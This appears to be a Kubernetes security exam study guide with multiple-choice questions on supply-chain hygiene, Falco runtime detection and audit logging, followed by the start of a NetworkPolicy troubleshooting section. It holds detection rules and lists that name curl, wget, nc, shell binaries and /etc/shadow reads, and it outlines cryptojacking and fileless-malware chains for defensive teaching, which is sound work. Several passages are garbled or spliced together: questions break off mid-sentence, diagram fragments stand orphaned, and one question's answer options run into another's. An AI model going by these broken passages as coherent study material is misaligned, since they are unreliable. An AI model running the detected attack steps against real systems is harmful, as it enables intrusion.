C) Only Critical CVEs matter — High/Medium/Low can be safely ignored in production
D) CVSS scores: Critical (9.0-10.0): Fix IMMEDIATELY — remote code execution, no auth needed. High (7.0-8.9): Fix within 30 days — privilege escalation, sensitive data exposure. Medium (4.0-6.9): Fix within 90 days — DoS, limited information disclosure. Low (0.1-3.9): Fix in next release cycle — hard-to-exploit or minimal impact. But ALSO consider: exploitability (is there a known exploit? KEV catalog), reachability (is the vulnerable code actually reachable?), and runtime exposure
✅ Correct Answer: D

Not all CVEs are created equal. A Critical CVE in a library your app doesn't use is noise. A Medium CVE with a known public exploit is urgent. Triage based on exploitability, not just the CVSS score. KEV (Known Exploited Vulnerabilities) catalog is your go-to for "act now" decisions.

Supply Chain Q155 of 200
Why is the :latest tag dangerous and what should you use instead?
A) :latest is a MOVING TARGET. Today it resolves to sha256:aaa..., tomorrow to sha256:bbb... This means: (1) No reproducibility — two deployments of the "same" tag can get different images. (2) No rollback — you can't know what :latest WAS yesterday. (3) No audit trail — no way to map running image to build. (4) Admission controllers can't verify the right image is running. ALWAYS use digests: anihpj-api@sha256:abc123... — immutable, auditable, verifiable
B) :latest is the most secure tag — it always runs the newest version with all patches
C) :latest is only dangerous for production — it's fine for development clusters
D) :latest is required by Kubernetes — pods can't start without it
✅ Correct Answer: A

:latest = "surprise me" in production. Digest = "this exact image, nothing else." Use digests in all production deployments. Block :latest with admission controllers. This is a CKS exam essential.

📝 Detailed Explanation
:latest vs Digest — The Problem
  ┌──────────────────────────────────────────────────────────────────┐
  │  :latest TRAP:                                                    │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ 10:00 AM: kubectl apply -f pod.yaml (image: anihpj:v2)      │ │
  │  │           → Resolves to sha256:aaa111 (GOOD)                 │ │
  │  │                                                               │ │
  │  │ 10:05 AM: Attacker pushes anihpj:v2 (different digest)      │ │
  │  │           → sha256:bbb222 (BACKDOORED)                        │ │
  │  │                                                               │ │
  │  │ 10:10 AM: Pod restarts (OOM/eviction/crash)                  │ │
  │  │           → Pulls anihpj:v2 → GETS sha256:bbb222              │ │
  │  │           → BACKDOORED IMAGE IS NOW RUNNING                   │ │
  │  │                                                                │ │
  │  │  IF USING DIGEST:                                             │ │
  │  │  image: anihpj@sha256:aaa111                                  │ │
  │  │  → ALWAYS gets the same image, no matter what                 │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘
Supply Chain Q156 of 200
How do you fix CVEs found by Trivy/Grype in container images?
A) Add --ignore-cve flag to Trivy to suppress the findings — problem solved
B) CVEs are unfixable — just accept the risk and move on
C) Three approaches: (1) Rebuild base image: Update FROM line (e.g., debian:12.4 → debian:12.7) — fixes OS CVEs. (2) Upgrade dependency: Update requirements.txt (Django 4.2.0 → 4.2.11) — fixes language CVEs. (3) Remove unnecessary package: If CVE is in curl but you don't need curl, remove it from the image (or use distroless). For unpatchable CVEs: apply compensating controls (network policy blocking, seccomp, readOnlyRoot)
D) Rebuild the entire application from scratch every time a CVE is found
✅ Correct Answer: C

CVEs are fixable — usually by updating base images or dependencies. The real challenge is knowing WHICH image has the CVE (SBOMs!) and having a process to rebuild and redeploy. Automate SBOM → Trivy → rebuild → sign → deploy.

  │  │ curl CVE-2024-xxx → Do you need curl in production?         │ │
  │  │ If NO: switch to distroless (no curl) → CVE gone            │ │
  │  │ If YES: compensating controls (NetworkPolicy, seccomp)     │ │

Supply Chain Q160 of 200
What lessons from SolarWinds, CodeCov, and 3CX supply chain attacks apply to Kubernetes?
A) Supply chain attacks are theoretical — there are no real-world Kubernetes examples
B) SolarWinds: Attackers compromised the BUILD PIPELINE and injected malware into signed updates. Lesson: SLSA Level 4 (hermetic builds) + provenance attestation would have detected unauthorized code changes. CodeCov: Attacker modified a CI script to exfiltrate environment variables (secrets!). Lesson: Pin CI actions to digest, not tag; use ephemeral CI credentials; audit CI configs. 3CX: Attacker compromised a dependency upstream. Lesson: SBOMs + dependency pinning + Trivy scanning would have flagged the compromised library. For Kubernetes: Sign images, verify signatures at admission, generate SBOMs, scan every commit, pin dependencies, never trust third-party images without verification
C) These attacks were all preventable with network firewalls — network security is the only solution
D) Only government agencies are targets of supply chain attacks — commercial companies are safe
✅ Correct Answer: B

The patterns repeat: compromise build → inject malware → sign with legitimate keys → distribute widely. Every lesson points to the same defense: SBOMs + signing + verification + scanning + provenance. This is the entire CKS Supply Chain domain in one question.

🟡 Intermediate: Detecting Threats in Real Time

6.1 Behavioral Analytics & Threat DetectionQ161-Q172

Monitoring/Runtime Q161 of 200
What is behavioral analytics in Kubernetes security and how does it differ from signature-based detection?
A) Behavioral analytics is the same as signature-based detection — both use known patterns
B) Behavioral analytics is only for network traffic — it doesn't apply to pod/container behavior
C) Signature-based: Matches known-bad patterns (e.g., "shell spawned in container" = alert). Behavioral analytics: Learns NORMAL behavior (baseline: "anihpj-api normally reads /app, opens port 8000, connects to PostgreSQL on 5432") and alerts on DEVIATIONS (e.g., "anihpj-api just executed curl to 10.0.0.99 — NEVER seen before"). This catches zero-day attacks that signature-based misses because there's no known signature yet
D) Behavioral analytics requires AI/ML — it can't be implemented without machine learning
✅ Correct Answer: C

Signature = "I know this is bad." Behavioral = "This is DIFFERENT from normal." Both are valuable. Falco does BOTH: default rules (signature) + custom rules based on your app's normal behavior (behavioral). The CKS exam focuses on Falco for behavioral detection.

📝 Detailed Explanation
Signature vs Behavioral Detection
  ┌──────────────────────────────────────────────────────────────────┐
  │  SIGNATURE-BASED:                                                 │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ Rule: IF process=bash AND container → ALERT                  │ │
  │  │ Catch: Known attack pattern (spawning shell in container)    │ │
  │  │ Miss: attack without shell (Python eval, SQL injection)      │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  BEHAVIORAL:                                                      │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ Baseline: anihpj-api NORMALLY:                                │ │
  │  │   • Execs: python manage.py                                  │ │
  │  │   • Network: outbound to db:5432, redis:6379                 │ │
  │  │   • Files: reads /app/*.py, writes /tmp/*                    │ │
  │  │                                                               │ │
  │  │ ALERT IF:                                                     │ │
  │  │   • Execs: curl, wget, nc (NEVER seen before!)               │ │
  │  │   • Network: outbound to 185.130.x.x (unknown IP!)           │ │
  │  │   • Files: reads /etc/shadow (NEVER seen before!)            │ │
  │  │                                                               │ │
  │  │ → Catches zero-days because ANY deviation alerts              │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

What is Falco and why is it the CNCF graduated standard for Kubernetes runtime security?
A) Falco is a CNI plugin — it monitors network traffic between pods
B) Falco is a CNCF GRADUATED project that monitors Linux syscalls in real time to detect anomalous behavior. It captures EVERY syscall (execve, open, connect, etc.), enriches them with Kubernetes metadata (pod name, namespace, labels), and evaluates them against rules. Example: "A shell was spawned in the anihpj-db container" → Falco alerts. It's the de facto standard for K8s runtime security — graduation means it's production-ready, widely adopted, and has a healthy community
C) Falco is a log aggregator — it replaces ELK/Splunk for Kubernetes logs
D) Falco is a deprecated project replaced by Tetragon — no longer recommended
✅ Correct Answer: B

Falco = your cluster's security camera. It sees everything: every command run, every file opened, every network connection made. And it knows Kubernetes context — which pod, namespace, and deployment generated each event. This is THE tool for CKS runtime security.

Monitoring/Runtime Q163 of 200
Describe Falco's architecture: kernel module / eBPF probe → userspace engine → rules → output.
A) Layer 1 (Kernel): eBPF probe or kernel module captures syscalls with near-zero overhead. Layer 2 (Userspace): Falco engine enriches syscalls with K8s metadata (pod, namespace, container). Layer 3 (Rules): Falco rules engine evaluates enriched events against YAML rules. Layer 4 (Output): Alerts sent to stdout, file, HTTP webhook, or Falcosidekick (→ Slack, PagerDuty, etc.). eBPF is preferred over kernel module (no kernel dependency, safer)
B) Falco is a single binary — no kernel component needed
C) Falco runs inside containers using /proc — it doesn't need kernel access
D) The kernel module is required — eBPF is experimental and not production-ready
✅ Correct Answer: A

Falco's layered architecture is elegant: kernel captures events, userspace enriches them, rules engine evaluates, outputs dispatch alerts. eBPF is the modern, safer approach — no kernel module loading, no kernel crashes.

📝 Detailed Explanation
Falco Architecture — 4 Layers
  ┌──────────────────────────────────────────────────────────────────┐
  │  LAYER 1: KERNEL SPACE (syscall capture)                          │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ eBPF probe (modern) OR kernel module (legacy)                │ │
  │  │ → Captures: execve(), open(), connect(), bind(), etc.        │ │
  │  │ → Near-zero overhead (eBPF is JIT-compiled)                  │ │
  │  │ → ring buffer → userspace                                    │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │       │                                                           │
  │       ▼                                                           │
  │  LAYER 2: USERSPACE ENGINE (enrichment)                           │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ libscap/libsinsp: enriches syscalls with context              │ │
  │  │ → Pod name, namespace, container ID, labels, image           │ │
  │  │ → "execve /bin/bash" → "execve in pod:anihpj-api, ns:prod"  │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │       │                                                           │
  │       ▼                                                           │
  │  LAYER 3: RULES ENGINE (evaluation)                               │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ YAML rules (default + custom):                                │ │
  │  │ - rule: Shell in Container                                    │ │
  │  │   condition: spawned_process and container and shell          │ │
  │  │   output: "Shell spawned in container (user=%user.name)"     │ │
  │  │   priority: WARNING                                           │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │       │                                                           │
  │       ▼                                                           │
  │  LAYER 4: OUTPUT (alerting)                                       │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ → stdout (logs)                                               │ │
  │  │ → /var/log/falco/alerts.log                                   │ │
  │  │ → HTTP webhook (→ Falcosidekick → Slack/Teams/PagerDuty)     │ │
  │  │ → gRPC (→ Falco exporter → Prometheus)                       │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

How does Falco capture syscalls, enrich them with Kubernetes metadata, and evaluate rules?
A) Falco reads kubectl output to determine pod state — it doesn't need kernel access
B) Falco only works with Docker — it doesn't understand Kubernetes pod/namespace context
C) Falco relies on audit logs — it doesn't directly monitor syscalls
D) Falco uses an eBPF probe loaded into the kernel to intercept ALL syscalls. The userspace driver (libscap) reads these events and enriches them with container metadata from the container runtime (containerd, CRI-O) and Kubernetes API. The result: "PID 12345 ran execve(/bin/bash)" becomes "Pod anihpj-api in namespace prod PID 12345 ran execve(/bin/bash)" — full Kubernetes context. Rules then evaluate this enriched event
✅ Correct Answer: D

Falco's magic is context enrichment. A raw syscall is just a PID and syscall number. Falco turns it into "container X in pod Y in namespace Z executed /bin/bash." This makes alerts actionable — you know exactly where to investigate.

How do you write a custom Falco rule? What are the required fields?
A) Falco rules are written in Python — you need programming skills to write them
B) Falco rules only support pre-built templates — custom rules are not possible
C) A Falco rule has: rule (name), desc (description), condition (a filtering expression using syscall fields), output (alert message with format specifiers), priority (DEBUG/INFO/WARNING/ERROR/CRITICAL), and optionally tags. Condition uses operators: and/or/not, comparisons, in. Built on top of macros and lists for reusability
D) Custom rules require modifying Falco source code and recompiling
✅ Correct Answer: C

Falco rules are YAML-based filtering expressions. The condition field is the heart — it filters millions of syscalls per second to find the interesting ones. Know the fields: rule, desc, condition, output, priority. CKS may ask you to interpret a rule.

📝 Detailed Explanation
Custom Falco Rule — Anatomy
  ┌──────────────────────────────────────────────────────────────────┐
  │  - rule: Unexpected Outbound Connection in DB Pod                  │
  │    desc: Detect data exfiltration from the database pod            │
  │    condition: >                                                    │
  │      evt.type=connect and container and                            │
  │      k8s.ns.name=prod and k8s.pod.name contains "anihpj-db"       │
  │      and not fd.sport=5432 and not fd.snet in (10.244.0.0/16)    │
  │    output: >                                                       │
  │      CRITICAL: DB pod connected to %fd.sip:%fd.sport               │
  │      (pod=%k8s.pod.name ns=%k8s.ns.name)                          │
  │    priority: CRITICAL                                              │
  │    tags: [anihpj, database, exfiltration]                          │
  │                                                                    │
  │  CONDITION BREAKDOWN:                                              │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ evt.type=connect        ← syscall: network connection       │ │
  │  │ container               ← macro: is it a container?         │ │
  │  │ k8s.ns.name=prod        ← namespace filter                  │ │
  │  │ k8s.pod.name contains...← pod name filter                   │ │
  │  │ not fd.sport=5432       ← exclude normal PostgreSQL port    │ │
  │  │ not fd.snet in (10...)  ← exclude internal cluster traffic  │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘
Monitoring/Runtime Q167 of 200
What are Falco macros and lists — how do they make rules reusable?
A) Macros: Named, reusable condition snippets. Example: - macro: is_container condition: container.id != host — can be used in any rule. Lists: Named collections of values. Example: - list: shell_binaries items: [/bin/sh, /bin/bash, /bin/zsh]. This DRY principle prevents copy-pasting the same conditions across rules and makes rules easier to maintain. A single macro change updates all rules that use it
B) Macros and lists are deprecated — Falco now uses a different rule format
C) Macros are for performance; lists are for readability — they're interchangeable
D) Lists can only contain numbers — string values must be hardcoded in rules
✅ Correct Answer: A

Macros and lists are the DRY principle for Falco rules. Define once, reuse everywhere. CKS may test your ability to read and understand a Falco rule that uses macros and lists.

📝 Detailed Explanation
Falco Macros & Lists — DRY Rules
  ┌──────────────────────────────────────────────────────────────────┐
  │  MACROS (reusable condition snippets):                            │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ - macro: is_container                                        │ │
  │  │   condition: container.id != host                             │ │
  │  │                                                               │ │
  │  │ - macro: is_db_pod                                            │ │
  │  │   condition: k8s.pod.label.app = anihpj-db                   │ │
  │  │                                                               │ │
  │  │ USAGE IN RULE:                                                │ │
  │  │   condition: spawned_process and is_container and is_db_pod  │ │
  │  │   → Uses macros instead of repeating full conditions        │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  LISTS (reusable value collections):                               │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ - list: shell_binaries                                        │ │
  │  │   items: [/bin/sh, /bin/bash, /bin/zsh, /bin/ash]            │ │
  │  │                                                               │ │
  │  │ - list: allowed_processes                                     │ │
  │  │   items: [python, gunicorn, postgres]                         │ │
  │  │                                                               │ │
  │  │ USAGE IN RULE:                                                │ │
  │  │   condition: proc.name in (shell_binaries)                   │ │
  │  │   → One list change updates ALL rules that use it            │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

Monitoring/Runtime Q170 of 200
How does process tree monitoring detect cryptojacking attacks?
A) Process tree monitoring is a Windows-only feature — it doesn't apply to Linux containers
B) Cryptojacking can only be detected by monitoring CPU usage — process trees are irrelevant
C) Cryptojacking typically spawns: exploit → shell → curl/wget → crypto-miner binary. Process tree monitoring sees: anihpj-api (Python) spawning /bin/bash (unexpected!) → spawning curl (downloads xmrig) → spawning xmrig (mining). Normal baseline: anihpj-api should ONLY spawn Python/gunicorn workers. A new child process (especially a binary not in the image) is a strong indicator of compromise. Falco can detect this with rules watching spawned_process
D) Cryptominers run at kernel level — they bypass process monitoring entirely
✅ Correct Answer: C

Process tree = "who spawned whom?" If your Django app spawns bash, which spawns curl, which spawns xmrig — that's cryptojacking. Falco sees the whole chain. This is the most reliable way to detect crypto miners.

Monitoring/Runtime Q171 of 200
How does network anomaly detection identify C2 (command & control) beaconing?
A) C2 beaconing has distinct patterns: periodic outbound connections (every 60s, every 5min), connections to newly registered domains, DNS queries to algorithmically generated domains (DGA), connections to known-bad IPs (threat intelligence). Falco + network rules detect: outbound connections to non-standard ports from DB pods, connections to IPs outside the cluster, and heartbeat-like periodic connections. Network anomaly = "this pod never connects to 185.x.x.x, why now?"
B) C2 beaconing detection requires AI/ML — rules-based tools like Falco can't detect it
C) Network anomaly detection is done by NetworkPolicy — not runtime security tools
D) C2 traffic is always encrypted — it's impossible to detect at the network level
✅ Correct Answer: A

Most malware phones home. The patterns are distinctive: periodic connections, unusual ports, unknown IPs. Falco sees these at the syscall level (connect()), even if the traffic is encrypted. Combine with threat intelligence feeds for known-bad IPs.

C2 Beaconing — Network Anomaly Patterns
  ┌──────────────────────────────────────────────────────────────────┐
  │  NORMAL TRAFFIC (anihpj-db):                                      │

  │  │ connect() to 10.244.0.1:53     ← DNS (UDP)                  │ │
  │  │ → Only known internal destinations                          │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  C2 BEACONING (compromised pod):                                  │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ T+0s:  connect() to 185.130.44.12:443   ← Initial beacon    │ │
  │  │ T+60s: connect() to 185.130.44.12:443   ← Periodic!         │ │
  │  │ T+120s: connect() to 185.130.44.12:443  ← Heartbeat!        │ │
  │  │ T+180s: connect() to 185.130.44.12:443  ← C2 confirmed      │ │
  │  │                                                               │ │
  │  │ PATTERNS:                                                     │ │
  │  │ ✅ Periodic (exactly 60s intervals)                          │ │
  │  │ ✅ Unknown external IP (not in allowlist)                   │ │
  │  │ ✅ Non-standard port from DB pod                             │ │

Monitoring/Runtime Q172 of 200
What is fileless malware and how can memory forensics detect it in containers?
A) Fileless malware is not possible in containers — containers always write to the filesystem
B) Memory forensics requires kernel access — it can't be done in containerized environments
C) Fileless malware is a Windows-only attack — it doesn't exist in Linux containers
D) Fileless malware runs entirely IN MEMORY — never writing to disk. Example: Python eval() executes malicious code in memory; /proc/self/mem injection modifies process memory. Traditional file-scanning (Trivy, ClamAV) MISSES it because there's no file. Detection: memory forensics via /proc/PID/maps and /proc/PID/mem, eBPF probes watching mprotect() with PROT_EXEC (memory becoming executable), and behavioral monitoring — "this Python process just allocated RWX memory" (highly suspicious)
✅ Correct Answer: D

Fileless malware is the advanced attacker's technique — no files to scan, no persistence on disk. Detection requires behavioral monitoring at the memory/syscall level, which is exactly what Falco/eBPF tools provide. CKS expects you to know this attack class exists and how runtime tools detect it.

📝 Detailed Explanation
Fileless Malware — Detection via Memory Forensics
  ┌──────────────────────────────────────────────────────────────────┐
  │  HOW FILELESS MALWARE WORKS:                                      │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ 1. Exploit RCE → Python eval() executes payload in memory   │ │
  │  │ 2. Payload injects into /proc/self/mem                      │ │
  │  │ 3. mprotect() marks memory as RWX (read-write-execute)      │ │
  │  │ 4. Malware runs entirely in RAM — NO FILE ON DISK           │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  WHY TRIVY/CLAMAV MISS IT:                                        │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ • No file written → no file to scan                          │ │
  │  │ • No package installed → no SBOM entry                       │ │
  │  │ • Memory-only → invisible to filesystem scanners            │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  DETECTION (eBPF/Falco):                                          │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ • mprotect() with PROT_EXEC = "memory became executable"    │ │
  │  │ • Process allocating RWX memory (highly anomalous!)          │ │
  │  │ • /proc/PID/maps showing anonymous executable regions       │ │
  │  │ → Falco rule: evt.type=mprotect and proc.is_container       │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

Describe the attack lifecycle: Reconnaissance → Initial Access → Execution → Persistence → Exfiltration.
A) Recon: Attacker scans for exposed API servers, dashboards, kubeconfigs on GitHub. Initial Access: Uses found kubeconfig or exploits exposed dashboard. Execution: kubectl exec into pod or creates a new malicious pod. Persistence: Creates a backdoor Deployment or cronjob that survives restarts.   │                                              │                    │
  │       DETECT HERE IF POSSIBLE ←              │                    │
  │       (Network scan alerts,                  │                    │
  │        GitHub secret scanning)               │                    │
  │                                              ▼                    │
  │  ┌──────────────┐   ┌──────────────┐                              │
  │  │ PERSISTENCE  │   │ EXFILTRATION │                              │

How does readOnlyRootFilesystem: true enforce immutability?

B) readOnlyRootFilesystem: true makes the container's root filesystem READ-ONLY. Attacker cannot: write malware to /bin, modify config files, create backdoor scripts, install packages, or add cron jobs. Why does imagePullPolicy: Always matter for runtime security?
A) Without Always, kubelet uses a CACHED image — which may be stale, tampered with, or from a compromised node. An attacker who compromised a node could modify the local image cache and run backdoored containers. imagePullPolicy: Always forces kubelet to verify the image digest against the registry on every pod start — ensuring the running image matches the signed, scanned image in the registry
B) imagePullPolicy: Always is for development only — production should use IfNotPresent
C) Image caching is handled by the registry — the pull policy doesn't affect security
D) Always pulling images consumes too much bandwidth — it's not practical for production
✅ Correct Answer: A

AlwaysPullImages admission controller enforces this cluster-wide. Never trust the node's image cache — always pull fresh and verify the digest against the signed registry image.

📝 Detailed Explanation
imagePullPolicy — Security Impact
  ┌──────────────────────────────────────────────────────────────────┐
  │  imagePullPolicy: IfNotPresent (DANGEROUS):                       │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ 1. Attacker compromises node                                 │ │
  │  │ 2. Modifies local image cache: anihpj-api:v2 → backdoored   │ │
  │  │ 3. Pod restarts → kubelet uses CACHED backdoored image      │ │
  │  │ 4. Registry has CLEAN image, but pod runs BACKDOORED        │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  imagePullPolicy: Always (SAFE):                                  │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ 1. Every pod start → kubelet pulls from registry            │ │
  │  │ 2. Digest verified against registry (no cache poisoning)    │ │
  │  │ 3. Image signature verified by admission controller         │ │
  │  │ 4. Pod runs CLEAN, signed, scanned image                    │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

What are the four audit policy levels: None, Metadata, Request, RequestResponse?
A) All levels are equivalent — they differ only in log format, not content
B) Only RequestResponse should be used — other levels are for debugging
C) None disables auditing entirely — the other three are aliases for the same level
D) None: Don't log matching requests. Metadata: Log request metadata (user, timestamp, resource, verb) but NOT body. Request: Log metadata + request body. RequestResponse: Log metadata + request body + response body. For Secrets, use RequestResponse (captures who read the Secret data). For read-heavy resources (ConfigMaps), use Metadata (avoid log bloat)
✅ Correct Answer: D

CKS expects you to know these levels. RequestResponse for Secrets (capture the data read), Metadata for high-volume reads (ConfigMaps, Events). None for health checks to avoid noise.

What are the audit stages: RequestReceived, ResponseStarted, ResponseComplete, Panic?
A) Audit stages are for debugging only — they don't affect security monitoring
B) All stages produce the same log entry — they're implementation details
C) RequestReceived: Log as soon as the request is received (before processing). ResponseStarted: Log when response headers are sent (long-running requests). ResponseComplete: Log when the full response is sent (most useful — includes status code). Panic: Log if the API server panics during processing. For security: use ResponseComplete for all sensitive operations — captures the full result
D) Panic stage is the only one that captures all request details
✅ Correct Answer: C

ResponseComplete is what you want for security — it captures both the request AND the result (was it allowed? denied? what data was returned?). This is essential for "who accessed which Secret and what did they get?"

What are audit backends: log backend vs webhook backend?
A) Both backends are identical — they just use different file formats
B) Log backend: Writes audit events to a FILE on the control plane node (/var/log/kubernetes/audit.log). Simple, local, requires log rotation. Webhook backend: SENDS audit events via HTTP POST to an external service (SIEM, Splunk, ELK). This enables: real-time streaming, off-node storage (survives node compromise), centralized correlation across clusters. Best practice: use BOTH — log for local debugging, webhook for centralized security monitoring
C) Webhook backend is deprecated — only use log backend
D) Log backend sends to external systems — webhook writes to local files
✅ Correct Answer: B

Webhook backend = real-time audit streaming. If a node is compromised, local audit logs can be deleted. Webhook-shipped logs survive node compromise because they're already off-node. Use both for defense-in-depth.

How do you ship Kubernetes audit logs to a centralized SIEM (Splunk, ELK, Datadog)?
A) Configure webhook audit backend to POST events to a fluentd/fluent-bit aggregator, which forwards to Splunk/ELK/Datadog. Alternative: Filebeat reads /var/log/kubernetes/audit.log and ships to Elasticsearch. D) SIEM integration requires a commercial Kubernetes plugin — not available in open-source
✅ Correct Answer: A

Centralized audit = single pane of glass for all clusters. When investigating an incident, you don't want to SSH into 6 control plane nodes to grep audit logs. Ship them to your SIEM in real time.

What is audit2rbac — converting audit logs into RBAC recommendations?
A) audit2rbac is a built-in Kubernetes feature — it runs automatically
B) Audit logs and RBAC are unrelated — you can't derive RBAC from audit data
C) audit2rbac analyzes audit logs to determine which permissions each ServiceAccount ACTUALLY uses, then generates a minimal RBAC policy granting ONLY those permissions. This implements least-privilege: instead of granting broad access "just in case," you grant exactly what the audit log proves is needed. Run for 30 days → generate policy → apply → remove old broad permissions. This is the most reliable way to achieve least-privilege RBAC
D) audit2rbac is a third-party tool that has been deprecated — no longer maintained
✅ Correct Answer: C

audit2rbac = data-driven RBAC. Instead of guessing what permissions an app needs, you MEASURE what it actually uses over 30 days. This is the gold standard for least-privilege implementation.

audit2rbac — Data-Driven Least Privilege

  │  STEP 1: COLLECT (30 days of audit logs)                          │

  │       │                                                           │

  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ $ audit2rbac -f audit.log --user api-sa                      │ │
  │  │                                                                │ │
  │  │ ACTUAL USAGE (last 30 days):                                   │ │
  │  │   pods: get, list, watch (in namespace: prod)                 │ │
  │  │   services: get (in namespace: prod)                          │ │
  │  │   secrets: get (specific: db-credentials)                     │ │
  │  └─────────────────────────────────────────────────────────────┘ │

🔧 Part 2: 100 Security Issues

Real-world Kubernetes security failure scenarios — each with symptom, 15 categorized causes (5 most likely + 5 less likely + 5 new cluster), diagnostic commands, solutions, and personal security advice. Patterned after the 5+5+5 cause-card format.

100Issues
6Categories
15Causes per Issue

🔐 Category 1: Cluster Setup Security (15 Issues)CS1-CS15

🟢 Cluster Setup Security — NetworkPolicy, TLS, Ingress, CIS Benchmarks

Cluster Setup security issues arise from misconfigured network policies, TLS certificates, exposed endpoints, and missing CIS benchmark hardening. These are the FIRST line of defense — if your network controls fail, attackers have free movement inside the cluster. For anihpj/jobpost, every pod must be isolated by NetworkPolicy, every endpoint must serve TLS, and every node must pass CIS benchmarks.

📌 CS1–CS3: NetworkPolicy Enforcement Failures

CS1
🔐 CATEGORY 1: CLUSTER SETUP — Issue CS1
NetworkPolicy Not Enforcing — Traffic Still Flows Despite Deny-All

🔍 Symptom: You created a deny-all NetworkPolicy to isolate the anihpj namespace, but anihpj-web can still curl anihpj-api:8000. The policy exists (kubectl get networkpolicy shows it) but pods communicate freely as if no policy is applied. kubectl describe networkpolicy shows the correct selectors — yet traffic flows unimpeded.

  kubectl get networkpolicy -n anihpj
  NAME        POD-SELECTOR          AGE
  deny-all    app=anihpj            10m

  kubectl exec -it anihpj-web-7d8f9 -n anihpj -- curl -s anihpj-api:8000/health
  {"status": "ok"}   ← SHOULD HAVE BEEN BLOCKED!

  kubectl describe networkpolicy deny-all -n anihpj
  PodSelector: app=anihpj
  PolicyTypes: Ingress
  Ingress: <none>  ← Deny-all ingress, but traffic still flows!
🔴5 Most Likely Causes
  1. CNI plugin does not support NetworkPolicy: The most common cause. Flannel in its default mode, or an incomplete CNI install, silently IGNORES NetworkPolicy resources. kubectl get pods -n kube-system | grep -E "calico|cilium|weave" — if none are running, your CNI doesn't enforce policies. Switch to Calico, Cilium, or Weave Net.
  2. NetworkPolicy only has Ingress rules, no Egress: You created a deny-all for INGRESS but pods can still initiate OUTBOUND connections. The anihpj-web pod makes an outbound curl to anihpj-api — this is EGRESS from web's perspective. You need BOTH policyTypes: [Ingress, Egress] for full isolation.
  3. Pod labels don't match the podSelector: The policy has podSelector: {app: anihpj} but your pods are labeled tier: api or component: web. NetworkPolicy podSelectors use LABEL matching — a mismatch means the policy selects ZERO pods. Verify: kubectl get pods -n anihpj --show-labels.
  4. Policy is in the wrong namespace: NetworkPolicies are NAMESPACE-SCOPED. A policy in the default namespace does NOT affect pods in the anihpj namespace. Always verify: kubectl get networkpolicy -A.
  5. Traffic is between pods on the SAME node (bypasses CNI): Some CNIs use local bridges for same-node pod-to-pod traffic that may bypass policy enforcement. Check if both pods are on the same node: kubectl get pods -n anihpj -o wide. Cilium and Calico enforce on same-node traffic; some minimal CNIs don't.
🟡5 Less Likely Causes
